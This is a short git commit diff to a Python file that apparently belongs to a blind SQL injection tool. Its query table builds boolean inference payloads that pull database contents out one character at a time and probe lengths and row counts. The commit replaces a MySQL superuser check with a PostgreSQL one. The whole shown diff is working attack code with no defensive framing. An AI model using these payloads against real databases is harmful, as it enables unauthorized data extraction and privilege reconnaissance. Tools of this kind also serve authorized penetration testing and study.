b44b96f8f662d511b9260c3aafb5a47b4b18718e
zinhart <aromzinhartdegraca@gmail.com>
2022-10-09 17:59:18 -0700

    Added postgres query for db admin

--- lib/queries.py
+++ lib/queries.py
@@ -13,6 +13,6 @@ QUERIES = {
         'STR_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
         'LENGTH_EXFIL': lambda sub_query,i: F"select length(({sub_query}))={i}",
         'COUNT_EXFIL': lambda sub_query,i: F"SELECT ({sub_query})={i}",
-        'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1"
+        'CURRENT_USER_IS_DB_ADMIN' : lambda:  F"SELECT current_setting('is_superuser')='on'"
     }
 }
